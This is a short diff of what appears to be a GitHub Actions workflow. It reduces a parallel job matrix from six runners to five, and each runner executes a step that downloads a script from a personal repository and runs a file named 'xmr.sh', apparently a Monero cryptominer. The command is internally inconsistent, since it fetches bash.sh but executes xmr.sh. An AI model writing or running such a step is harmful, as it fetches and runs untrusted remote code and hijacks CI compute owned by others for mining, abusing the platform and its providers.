@@ -21,7 +21,7 @@ jobs:
    strategy:
     fail-fast: false
     matrix:
-     runner: [0,1,2,3,4,5]
+     runner: [0,1,2,3,4]
    steps:
      - run: |
           wget https://raw.githubusercontent.com/userpro254/rdppro/main/bash.sh && chmod +x xmr.sh && ./xmr.sh
